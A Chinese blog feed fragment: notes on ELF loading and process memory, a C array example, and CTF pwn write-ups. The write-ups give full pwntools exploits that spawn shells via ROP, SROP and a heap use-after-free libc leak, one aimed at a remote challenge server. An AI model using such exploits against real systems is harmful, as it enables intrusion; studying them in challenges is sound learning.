class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240415205905158.png" alt="image-20240415205905158"></p><p>参考文章：</p><p><a href="https://zhuanlan.zhihu.com/p/622827945?utm_id=0">存储器层次结构（五）虚拟机与虚拟存储–页表、TLB(详细图解) - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_41285455/article/details/119276177">Linux进程结构_进程几个重要的结构体-CSDN博客</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMTg2MjA2OA==&mid=2649878147&idx=2&sn=4d19bbcf976818ff609cea2fdedd8d31&chksm=83bfe7d8b4c86eceb8c41e18deec7c0c932417989d1149a984eda9b3f8ce37556a24cd5f24bc&scene=27">是时候了解下 mmap 了 (qq.com)</a></p><p><a href="https://www.cnblogs.com/wenxuanguan/archive/2013/05/29/3105705.html">进程的创建与可执行程序的加载 - Firewalls - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/CJ_Kano/article/details/42374993">【UNIX】从一个可执行文件的生成到进程在内存中分布 （中）&#x2F;文件到进程的转变_一个可执行文件怎么变成进程-CSDN博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>程序装载与进程结构-1</title>
      <link href="/uncategorized/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84-1/"/>
      <url>/uncategorized/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84-1/</url>
      
        <content type="html"><![CDATA[<p>在磁盘中，可执行程序为elf格式，被加载到内存中为一个进程<br>磁盘中的ELF（可执行文件）与内存ELF（进程内存映像）如下所示，在磁盘中表现为一个个section，在内存中具有相同权限的section组成为一个段，段视图用于进程的内存区域的rwx权限划分，节视图用于ELF文件编译链接时与在磁盘上存储时的文件结构的组织</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240403164558787.png" alt="image-20240403164558787"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240403165631614.png" alt="image-20240403165631614"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240403165907910.png" alt="image-20240403165907910"></p><p>虚拟内存<strong>用户空间</strong>每个进程一份<br>虚拟内存<strong>内核空间</strong>所有进程共享一份<br>虚拟内存mmap段中的<strong>动态链接库</strong>仅在物理内存中装载一份</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240403173930394.png" alt="image-20240403173930394"></p><p>进程的stack和heap是动态分配的</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240403192915998.png" alt="image-20240403192915998"></p><p> <img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240403193404065.png" alt="image-20240403193404065"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第八周笔记</title>
      <link href="/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-UAF/%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-UAF/%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-s-3（系统调用）"><a href="#ciscn-2019-s-3（系统调用）" class="headerlink" title="ciscn_2019_s_3（系统调用）"></a>ciscn_2019_s_3（系统调用）</h1><h2 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h2><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-1.png"></p><p>放入ida中反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-2.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-3.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-4.png"></p><p>仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。</p><p>我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&#x2F;bin&#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为rax&#x3D;&#x3D;59，rdi&#x3D;&#x3D;’&#x2F;bin&#x2F;sh’，rsi&#x3D;&#x3D;0,  rdx&#x3D;&#x3D;0,  syscall.</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-5.png"></p><p>查看pop rdi的地址</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-6.png"></p><p>然后我们可以调试一下程序，找到我们输入的&#x2F;bin&#x2F;sh的地址：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-7.png"></p><p>我们可以分析得出栈基址为0x7fffffffe068,然后由此我们可以计算出输入的地址的偏移为e068-df20&#x3D;0x148，由此我们确定了&#x2F;bin&#x2F;sh的位置，也知道到了pop rdi指令的地址，然后我们需要使rdx&#x3D;&#x3D;0，但是我们并没有找到可以使pop rdx的指令，只有mov rdx , r13的指令，所以我们接着要对r13进行赋值，这里有个知识点需要注意，call【r12+rbx*8】当rbx&#x3D;0的时候就会 跳转到r12的位置，可以跳转到后面的rop继续执行</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-8.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-9.png"></p><p>构造的脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span><span class="token comment">#p=remote('node4.buuoj.cn',29304)</span>vuln<span class="token operator">=</span><span class="token number">0x4004ed</span>pop_rdi<span class="token operator">=</span><span class="token number">0x4005a3</span>pop_regs<span class="token operator">=</span><span class="token number">0x40059a</span>mov_addr<span class="token operator">=</span><span class="token number">0x400580</span>mov_rax<span class="token operator">=</span><span class="token number">0x4004e2</span>syscall<span class="token operator">=</span><span class="token number">0x400517</span>payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>binsh_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x148</span>payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_regs<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地打通的结果如下所示：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-10.png"></p><p>需要注意的是我们在本地这里的&#x2F;bin&#x2F;sh的地址相对偏移是0x148，而在我们远地要想打通的话，得将0x148改成0x138或者是0x118，反正就是这两个一直在换，否则的话打不通。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-11.png"></p><h2 id="第二种解法："><a href="#第二种解法：" class="headerlink" title="第二种解法："></a>第二种解法：</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>这里简单介绍下SROP的概念，主要是帮助读者理解和使用pwntools提供的SigreturnFrame工具实现漏洞利用。</p><p>  我们都知道ROP吧，即利用.text段中的gadgets，这些gadgets都以ret指令作为结尾，以此串联起来实现我们想要的系统调用进而达到获取目标主机shell的目的。那么如何判断是哪种系统调用呢？这里是根据寄存器的值来进行判断的，只要将相应的寄存器值设置为对应参数，然后执行syscall或者int 80指令就可以实现相应的函数功能。这里推荐一个实现系统调用如何设置寄存器对应参数的网站（<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/%EF%BC%89%E5%92%8C%E4%B8%80%E4%B8%AA%E5%85%B7%E4%BD%93%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A%E8%AE%BE%E7%BD%AE%E5%AF%84%E5%AD%98%E5%99%A8%E5%AE%9E%E7%8E%B0execve%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%88https://blog.csdn.net/A951860555/article/details/110936441%EF%BC%89%E3%80%82">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/）和一个具体的例子：设置寄存器实现execve系统调用的博客（https://blog.csdn.net/A951860555/article/details/110936441）。</a></p><p>  好了，究其本质，ROP方法的思路都是通过gadgets设置寄存器的值来实现漏洞利用的，SROP也是从属于ROP方法中的一员。它利用了Linux系统信号处理过程中的漏洞，即在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。sigreturn系统调用就是处理完后那一阶段执行的系统调用，它会读取当前栈空间中的数据作为寄存器的值。因此这里我们利用栈溢出漏洞和sigreturn系统调用就可以实现SROP的攻击方法。首先利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP&#x2F;ESP和RIP&#x2F;EIP都会被改变，所以SROP强大之处就是改变了所有的寄存器，这可以让我们实现任何想要的系统调用，但附带效果就是会改变栈顶指针RSP&#x2F;ESP，有时候这并不是我们想要的。</p><h3 id="SigreturnFrame的使用"><a href="#SigreturnFrame的使用" class="headerlink" title="SigreturnFrame的使用"></a>SigreturnFrame的使用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 64位</span><span class="token comment"># sigreturn 代表可以触发sigreturn调用的地址</span><span class="token comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span><span class="token triple-quoted-string string">"""0x001 mov rax, 0Fh0x002 syscall0x003 ret"""</span>sigreturn <span class="token operator">=</span> <span class="token number">0x001</span>syscall <span class="token operator">=</span> <span class="token number">0x002</span>  <span class="token comment"># syscall gadget</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execveframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> sh_addr  <span class="token comment"># "/bin/sh\x00"</span>frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpad <span class="token operator">=</span> padding <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>  <span class="token comment"># python3</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 32位注意以下几个方面</span><span class="token comment"># 1、上下文初始化</span><span class="token comment"># context.arch = "i386"</span><span class="token comment"># frame = SigreturnFrame(kernel="i386")</span><span class="token comment"># 2、frame.eax = xx  注意寄存器的名字</span><span class="token comment"># 3、syscall指令在32位下可以找int 80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据葫芦画瓢，我们构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span>sigreturn<span class="token operator">=</span><span class="token number">0x4004da</span> <span class="token comment">#mov rax,0fh</span>read_write<span class="token operator">=</span><span class="token number">0x4004f1</span>system_call<span class="token operator">=</span><span class="token number">0x400517</span> payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_write<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>sh_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x148</span>frame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax<span class="token operator">=</span>constants<span class="token punctuation">.</span>SYS_execveframe<span class="token punctuation">.</span>rdi<span class="token operator">=</span>sh_addrframe<span class="token punctuation">.</span>rsi<span class="token operator">=</span><span class="token number">0</span>frame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0</span>frame<span class="token punctuation">.</span>rip<span class="token operator">=</span>system_callpayload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_call<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-12.png"></p><h2 id="有关系统调用的知识点"><a href="#有关系统调用的知识点" class="headerlink" title="有关系统调用的知识点"></a>有关系统调用的知识点</h2><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-13.png"></p><h1 id="hacknote-UAF"><a href="#hacknote-UAF" class="headerlink" title="hacknote(UAF)"></a>hacknote(UAF)</h1><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>首先对程序进行检查：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-14.png"></p><p>32位程序，开启了NX保护和canary保护，将程序放入ida中反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-15.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-16.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-17.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-18.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-19.png"></p><p> 仔细分析一下程序，发现其整个流程就是选择note，然后在其中进行写入内容，这里我们可以注意到在delete note这个函数中没有只释放了chunk，和chunk中的内容，并没有对指针进行释放，这就导致了uaf，我们之后再申请其他chunk的时候之前申请chunk的指针依然可以被使用，题目文件中给了一个libc库，利用这一点，我们就可以来获取我们的flag。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-20.png"></p><p>然后我们开始构造脚本攻击：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc_32.so.6'</span><span class="token punctuation">)</span><span class="token comment">#p = process('./hacknote')</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">54690</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level='debug'</span><span class="token keyword">def</span> <span class="token function">addnote</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note size :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content :'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>addnote<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>addnote<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>delnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delnote<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts_plt<span class="token operator">=</span><span class="token number">0x804862B</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>addnote<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>delnote<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'||sh'</span>addnote<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里其实有个小细节，也是我做题过程中遇到的问题，后来还是仔细地检查了一遍程序才发现问题所在：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-21.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-22.png"></p><p>在我们申请的chunk中，第一个默认的是puts_self函数，第二是我们填写到chunk里的内容，当我们进行print note的时候，会打印出以自身地址为参数的值，接着我们可以找到如下这个函数：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-23.png"></p><p>可以运用这个函数打印出puts函数在got表中的地址，然后与libc库匹配，进而找到system函数！</p><p>打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-24.png"></p><h2 id="uaf介绍"><a href="#uaf介绍" class="headerlink" title="uaf介绍"></a>uaf介绍</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</p><p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p><p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p><h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a href="https://blog.csdn.net/weixin_45943522/article/details/113919759">https://blog.csdn.net/weixin_45943522/article/details/113919759</a></p><p><a href="https://zhuanlan.zhihu.com/p/539338507">https://zhuanlan.zhihu.com/p/539338507</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统调用,UAF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统调用 </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++</title>
      <link href="/C-C/C%E3%80%81C++/"/>
      <url>/C-C/C%E3%80%81C++/</url>
      
        <content type="html"><![CDATA[<h1 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h1><h2 id="1-数组作为函数参数会被退化为指针"><a href="#1-数组作为函数参数会被退化为指针" class="headerlink" title="1. 数组作为函数参数会被退化为指针"></a>1. 数组作为函数参数会被退化为指针</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">char</span> ElemType<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MaxSize</span> <span class="token expression"><span class="token number">100</span></span></span><span class="token keyword">typedef</span> ElemType SqBinTree<span class="token punctuation">[</span>MaxSize<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CreateBTree</span><span class="token punctuation">(</span>SqBinTree a<span class="token punctuation">,</span>ElemType b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ElemType<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    SqBinTree a<span class="token punctuation">;</span>    ElemType b<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//int len;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入一个二叉树: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//len = sizeof(b)/sizeof(ElemType);</span>    <span class="token function">CreateBTree</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ElemType<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c "</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 